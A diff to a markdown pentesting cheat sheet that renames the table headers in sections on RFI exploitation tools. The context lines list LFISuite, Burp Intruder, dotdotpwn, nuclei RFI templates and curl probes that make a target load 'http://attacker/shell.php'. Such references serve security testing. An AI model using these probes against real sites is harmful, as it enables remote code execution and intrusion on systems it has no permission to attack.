@@ -22,7 +22,7 @@ linked:
 
 ## LFISuite RFI Mode
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Repo | `git clone https://github.com/D35m0nd142/LFISuite` | Python — LFI/RFI auto-exploit. |
 | Run interactive | `python LFISuite.py` | Menu-driven. |
@@ -43,7 +43,7 @@ ___
 
 ## Burp Intruder + Payloads
 
-| **Workflow** | **Setup** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Mark position | Select param value en Repeater | Standard. |
 | Sniper attack | Single position, multi-payloads | Default. |
@@ -63,7 +63,7 @@ ___
 
 ## Manual curl Scripts
 
-| **Workflow** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Single probe | `curl "https://target/?page=http://attacker/shell.php"` | Standard. |
 | With custom port | `curl "...?page=http://attacker:8080/x"` | Non-standard port. |
@@ -130,7 +130,7 @@ ___
 
 ## Otros Tools
 
-| **Tool** | **Uso** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | dotdotpwn (LFI/RFI mode) | https://github.com/wireghoul/dotdotpwn | Old but functional. |
 | nuclei templates | `nuclei -t vulnerabilities/generic/rfi.yaml` | Bulk scan. |
